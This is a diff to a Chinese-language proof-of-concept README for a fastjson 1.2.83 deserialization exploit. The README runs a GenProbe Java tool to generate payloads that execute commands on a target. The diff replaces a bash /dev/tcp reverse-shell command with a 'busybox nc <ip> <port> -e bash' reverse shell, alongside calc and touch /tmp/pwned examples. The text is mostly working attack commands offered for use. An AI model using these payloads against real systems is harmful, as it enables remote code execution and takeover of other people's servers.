@@ -26,7 +26,7 @@ javac -cp "poc/lib/*" -d poc poc/GenProbe.java
 java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 127.0.0.1 19090 "touch /tmp/pwned"
 ```
 
-Windows 弹计算器改最后参数为 `"calc"`，反弹 shell 改为 `"bash -i >& /dev/tcp/VPS/4444 0>&1"`
+Windows 弹计算器改最后参数为 `"calc"`，反弹 shell 改为 `"busybox nc <ip> <port> -e bash"`
 
 ### Step 3: 启动 HTTP 托管
 
@@ -66,7 +66,7 @@ java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 127.0.0.
 java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 192.168.1.100 19090 "calc"
 
 # 反弹 shell
-java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 1.2.3.4 19090 "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
+java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 1.2.3.4 19090 "busybox nc <ip> <port> -e bash"
 ```
 
 ## 漏洞原理
